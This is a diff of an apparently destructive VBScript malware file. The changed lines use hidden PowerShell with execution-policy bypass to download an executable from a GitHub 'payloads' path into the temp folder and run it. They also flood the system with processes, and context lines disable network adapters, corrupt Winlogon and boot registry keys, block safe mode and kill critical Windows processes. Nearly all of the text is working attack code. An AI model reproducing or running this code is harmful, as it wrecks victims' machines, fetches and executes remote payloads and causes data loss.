@@ -107,13 +107,10 @@ x7p9q.Run "netsh interface set interface ""Ethernet"" disable", 0, True ' Kill E
 x7p9q.Run "netsh interface set interface ""Wi-Fi"" disable", 0, True ' Kill Wi-Fi
 x7p9q.Run "netsh interface set interface ""Local Area Connection"" disable", 0, True
 
-' Flood system with processes
-For r4t6y = 1 To 10000
-    x7p9q.Run "notepad.exe", 1, False 
-    x7p9q.Run "calc.exe", 1, False 
-    x7p9q.Run "mspaint.exe", 1, False
-Next
-
+Dim path
+path = x7p9q.ExpandEnvironmentStrings("%TEMP%") & "\toy.exe"
+x7p9q.Run "powershell.exe -ep bypass -noP -w hidden ""iwr -uri 'https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/payloads/fun/update.exe' -outfile '"& path & "'""", 0, True
+x7p9q.Run path, 0, True
 
 For j6q4x = 1 To 15
     x7p9q.Popup "SYSTEM ANNIHILATED: YOUR DATA IS GONE FOREVER.", 0, "CRITICAL ERROR", 16
@@ -200,10 +197,12 @@ k9m2v.RegWrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Useri
 k9m2v.RegWrite "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\BootExecute", "invalid_command", "REG_MULTI_SZ" ' Break boot
 k9m2v.RegWrite "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Option\OptionValue", "0", "REG_DWORD" ' No safe mode
 
-Dim path
-path = x7p9q.ExpandEnvironmentStrings("%TEMP%") & "\toy.exe"
-x7p9q.Run "powershell.exe -ep bypass -noP -w hidden ""iwr -uri 'https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/payloads/fun/update.exe' -outfile '"& path & "'""", 0, True
-x7p9q.Run path, 0, True
+' Flood system with processes
+For r4t6y = 1 To 1000
+    x7p9q.Run "notepad.exe", 1, False 
+    x7p9q.Run "calc.exe", 1, False 
+    x7p9q.Run "mspaint.exe", 1, False
+Next
 
 ' kill critical processes
 x7p9q.Run "taskkill /F /IM explorer.exe", 0, True
@@ -211,14 +210,3 @@ x7p9q.Run "taskkill /F /IM svchost.exe", 0, True
 x7p9q.Run "taskkill /F /IM winlogon.exe", 0, True ' Extra chaos
 
 On Error GoTo 0
-
-' Do
-'     WScript.Sleep 15000 ' Wait 15 seconds
-'     For r4t6y = 1 To 500
-'         x7p9q.Run "notepad.exe", 0, False
-'         x7p9q.Run "calc.exe", 0, False
-'     Next
-'     x7p9q.Run "taskkill /F /IM explorer.exe", 0, True
-'     x7p9q.Popup "YOUR PC IS A CORPSE. GOODBYE.", 0, "System Failure", 16
-' Loop
-' x7p9q.Run "powershell remove-item -path '" & f & "' -force", 0, False
